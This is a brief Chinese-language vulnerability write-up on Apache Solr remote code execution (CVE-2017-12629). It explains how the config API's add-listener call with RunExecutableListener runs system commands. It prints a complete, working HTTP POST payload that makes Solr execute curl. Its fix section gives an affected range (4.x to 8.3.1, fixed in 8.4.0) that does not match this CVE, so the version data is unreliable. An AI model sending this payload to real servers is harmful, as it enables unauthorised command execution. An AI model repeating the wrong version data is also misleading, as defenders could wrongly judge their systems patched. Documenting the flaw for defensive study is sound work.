### 一 漏洞描述
Apache Solr Rce(CVE-2017-12629)

Apache Solr 是Apache开发的一个开源的基于Lucene的全文搜索服务器。  
其集合的配置方法（config路径）可以增加和修改监听器，增加时能通过RunExecutableListener执行任意系统命令。


### 二 漏洞利用
增加监听器触发命令执行
```POST /solr/newcollection/config HTTP/1.1
Host: localhost:8983
Connection: close
Content-Type: application/json  
Content-Length: 198

{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener",
    "class":"solr.RunExecutableListener",
    "exe":"curl",
    "dir":"/usr/bin/",
    "args":["http://127.0.0.1:8080"]
  }
}
```

### 三 漏洞修复
升级solr到8.4.0

受影响的版本： 4.x至8.3.1

下载地址：https://lucene.apache.org/solr/downloads.html

> 参考：
> https://www.freebuf.com/sectool/159970.html
> https://cloud.tencent.com/developer/article/1144777
